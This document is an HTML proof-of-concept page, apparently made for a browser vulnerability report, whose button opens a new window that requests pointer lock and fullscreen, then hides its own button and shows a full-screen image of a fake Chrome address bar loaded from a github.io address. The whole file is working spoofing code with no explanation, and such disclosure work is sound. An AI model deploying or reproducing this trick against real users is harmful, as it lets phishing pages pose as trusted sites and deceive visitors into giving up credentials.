<!DOCTYPE html>
<html>
<head>
  <title>PoC Launcher</title>
</head>
<body>

  <button onclick="launch()">Launch PoC</button>

  <script>
    function launch() {
      const win = window.open('about:blank', '_blank');

      const poc = `
        <!DOCTYPE html>
        <html>
        <head>
          <style>
            body {
              margin: 0;
              padding: 0;
              background-color: #000;
              overflow: hidden;
            }
            #fake-ui {
              display: none;
              position: fixed;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
              object-fit: cover;
            }
          </style>
        </head>
        <body>

          <button id="btn" onclick="spoof()">Click here</button>
          <img id="fake-ui" src="https://heloworld285.github.io/chrome.jpeg" alt="Fake Address Bar">

          <script>
            function spoof() {
              document.body.requestPointerLock();

              setTimeout(() => {
                document.body.requestFullscreen().then(() => {
                  document.getElementById('btn').style.display = 'none';
                  document.getElementById('fake-ui').style.display = 'block';
                }).catch(err => {
                  console.error(err);
                });
              }, 1000);
            }
          <\/script>
        </body>
        </html>
      `;

      win.document.open();
      win.document.write(poc);
      win.document.close();
    }
  </script>

</body>
</html>
